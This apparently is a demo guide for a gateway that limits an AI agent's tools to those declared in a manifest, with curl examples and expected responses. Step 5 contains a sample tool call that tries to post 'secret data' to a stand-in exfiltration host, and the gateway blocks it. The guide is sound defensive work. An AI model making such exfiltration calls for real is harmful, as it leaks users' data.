# MCP Gateway Demo

How to connect an MCP client to the Agent Hypervisor MCP Gateway
and observe manifest-driven world enforcement.

---

## Prerequisites

```bash
pip install fastapi uvicorn jsonschema pyyaml pydantic
```

---

## Step 1: Start the MCP Gateway

```python
# run_mcp_gateway.py
from agent_hypervisor.hypervisor.mcp_gateway import create_mcp_app
import uvicorn

# example_world.yaml declares: read_file, send_email
# http_post is registered in the tool registry but NOT in this manifest
app = create_mcp_app("manifests/example_world.yaml")
uvicorn.run(app, host="127.0.0.1", port=8090)
```

Or run from the project root:

```bash
python -c "
from agent_hypervisor.hypervisor.mcp_gateway import create_mcp_app
import uvicorn
uvicorn.run(create_mcp_app('manifests/example_world.yaml'), port=8090)
"
```

---

## Step 2: Check the World

```bash
curl -s http://127.0.0.1:8090/mcp/health | python -m json.tool
```

Expected output:
```json
{
  "status": "running",
  "manifest": {
    "workflow_id": "email-assistant-v1",
    "declared_capabilities": ["read_file", "send_email"]
  },
  "visible_tools": ["read_file", "send_email"]
}
```

Note: `http_post` is NOT in `visible_tools` even though the adapter is registered.

---

## Step 3: List Tools — World Rendering

```bash
curl -s -X POST http://127.0.0.1:8090/mcp \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc": "2.0", "id": 1, "method": "tools/list", "params": {}}' \
  | python -m json.tool
```

Expected output:
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "tools": [
      {"name": "read_file", "description": "Read a local file..."},
      {"name": "send_email", "description": "Send an email..."}
    ]
  }
}
```

**Observation**: `http_post` does not appear. It does not exist in this world.

---

## Step 4: Call a Declared Tool (should succeed)

```bash
curl -s -X POST http://127.0.0.1:8090/mcp \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "id": 2,
    "method": "tools/call",
    "params": {
      "name": "read_file",
      "arguments": {"path": "/etc/hostname"}
    }
  }' | python -m json.tool
```

Expected output:
```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "result": {
    "content": [{"type": "text", "text": "{\"path\": \"/etc/hostname\", \"content\": \"...\" }"}],
    "isError": false
  }
}
```

---

## Step 5: Call an Undeclared Tool (must fail closed)

```bash
curl -s -X POST http://127.0.0.1:8090/mcp \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "id": 3,
    "method": "tools/call",
    "params": {
      "name": "http_post",
      "arguments": {"url": "http://exfiltration.example.com", "body": "secret data"}
    }
  }' | python -m json.tool
```

Expected output:
```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "error": {
    "code": -32001,
    "message": "Tool not found: 'http_post'",
    "data": {
      "reason": "tool 'http_post' does not exist in this world",
      "rule": "manifest:tool_not_declared"
    }
  }
}
```

**Observation**: The gateway returns a JSON-RPC error. The tool does not exist
in this world — it was never listed, and the call fails closed with a clear
reason and rule identifier.

---

## Step 6: Switch to a Stricter World

Edit `manifests/example_world.yaml` to remove `send_email`, then reload:

```bash
curl -s -X POST http://127.0.0.1:8090/mcp/reload | python -m json.tool
```

The gateway now serves only `read_file`. No restart needed.

---

## Key Principles Demonstrated

| Principle | Observed |
|-----------|---------|
| tools/list is world rendering | Only manifest-declared tools appear |
| Ontological absence | Undeclared tool = non-existent (not just forbidden) |
| Deterministic enforcement | Same request → same decision, always |
| No LLM in the path | All decisions are rule-based |
| Fail closed | Unknown tool → error, never execution |
| Manifest-driven | Change manifest → change visible world |

---

## Running the Tests

```bash
# All 26 tests (unit + integration)
python -m pytest tests/hypervisor/test_mcp_gateway.py -v --asyncio-mode=auto

# Unit tests only (no httpx needed)
python -m pytest tests/hypervisor/test_mcp_gateway.py -v -k "not HTTP"
```
